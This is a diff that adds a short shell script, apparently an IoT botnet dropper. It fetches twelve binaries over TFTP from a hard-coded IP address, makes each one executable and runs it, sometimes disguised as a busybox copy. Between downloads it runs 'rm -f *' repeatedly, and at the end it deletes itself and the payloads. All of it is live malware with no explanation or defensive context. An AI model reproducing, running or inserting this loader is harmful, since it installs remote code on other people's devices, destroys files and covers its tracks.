@@ -1,0 +1,54 @@
+#!/bin/sh
+
+tftp -r sc1 -g 89.234.183.73; chmod +x sc1; ./sc1;  rm -rf sc1*
+rm -f *
+tftp -r sc2 -g 89.234.183.73; chmod +x sc2; ./sc2;  rm -rf sc2*
+rm -f *
+tftp -r sc3 -g 89.234.183.73; chmod +x sc3; ./sc3;  rm -f sc3*
+rm -f *
+tftp -r sc3 -g 89.234.183.73; chmod +x sc3; ./sc3;  rm -rf sc3*
+rm -f *
+tftp -r sc4 -g 89.234.183.73; chmod +x sc4; ./sc4;  rm -rf sc4*
+rm -f *
+tftp -r sc5 -g 89.234.183.73; chmod +x sc5; ./sc5;  rm -rf sc5*
+rm -f *
+tftp -r sc6 -g 89.234.183.73; chmod +x sc6; ./sc6;  rm -rf sc6*
+rm -f *
+tftp -r sc7 -g 89.234.183.73; chmod +x sc7; ./sc7;  rm -rf sc7*
+rm -f *
+tftp -r sc8 -g 89.234.183.73; chmod +x sc8; ./sc8;  rm -rf sc8*
+rm -f *
+tftp -r sc9 -g 89.234.183.73; chmod +x sc9; ./sc9;  rm -rf sc9*
+rm -f *
+tftp -r sc10 -g 89.234.183.73; chmod +x sc10; ./sc10;  rm -rf sc10*
+rm -f *
+tftp -r sc11 -g 89.234.183.73; chmod +x sc11; ./sc11;  rm -rf sc11*
+rm -f *
+tftp -r sc12 -g 89.234.183.73; chmod +x sc12; ./sc12;  rm -rf sc12*
+rm -f *
+tftp -r sc1 -g 89.234.183.73; cp /bin/busybox ./; cat sc1 > busybox; rm -f sc1; cp busybox sc1; rm -f busybox; ./sc1; rm -f sc1*
+rm -f *
+tftp -r sc2 -g 89.234.183.73; cp /bin/busybox ./; cat sc2 > busybox; rm -f sc2; cp busybox sc2; rm -f busybox; ./sc2; rm -f sc2*
+rm -f *
+tftp -r sc3 -g 89.234.183.73; cp /bin/busybox ./; cat sc3 > busybox; rm -f sc3; cp busybox sc3; rm -f busybox; ./sc3; rm -f sc3*
+rm -f *
+tftp -r sc4 -g 89.234.183.73; cp /bin/busybox ./; cat sc4 > busybox; rm -f sc4; cp busybox sc4; rm -f busybox; ./sc4; rm -f sc4*
+rm -f *
+tftp -r sc5 -g 89.234.183.73; cp /bin/busybox ./; cat sc5 > busybox; rm -f sc5; cp busybox sc5; rm -f busybox; ./sc5; rm -f sc5*
+rm -f *
+tftp -r sc6 -g 89.234.183.73; cp /bin/busybox ./; cat sc6 > busybox; rm -f sc6; cp busybox sc6; rm -f busybox; ./sc6; rm -f sc6*
+rm -f *
+tftp -r sc7 -g 89.234.183.73; cp /bin/busybox ./; cat sc7 > busybox; rm -f sc7; cp busybox sc7; rm -f busybox; ./sc7; rm -f sc7*
+rm -f *
+tftp -r sc8 -g 89.234.183.73; cp /bin/busybox ./; cat sc8 > busybox; rm -f sc8; cp busybox sc8; rm -f busybox; ./sc8; rm -f sc8*
+rm -f *
+tftp -r sc9 -g 89.234.183.73; cp /bin/busybox ./; cat sc9 > busybox; rm -f sc9; cp busybox sc9; rm -f busybox; ./sc9; rm -f sc9*
+rm -f *
+tftp -r sc10 -g 89.234.183.73; cp /bin/busybox ./; cat sc10 > busybox; rm -f sc10; cp busybox sc10; rm -f busybox; ./sc10; rm -f sc10
+rm -f *
+tftp -r sc11 -g 89.234.183.73; cp /bin/busybox ./; cat sc11 > busybox; rm -f sc11; cp busybox sc11; rm -f busybox; ./sc11; rm -f sc11
+rm -f *
+tftp -r sc12 -g 89.234.183.73; cp /bin/busybox ./; cat sc12 > busybox; rm -f sc12; cp busybox sc12; rm -f busybox; ./sc12; rm -f sc12
+rm -f *
+sleep 3;
+rm -f .sc.sh && rm -f sc*
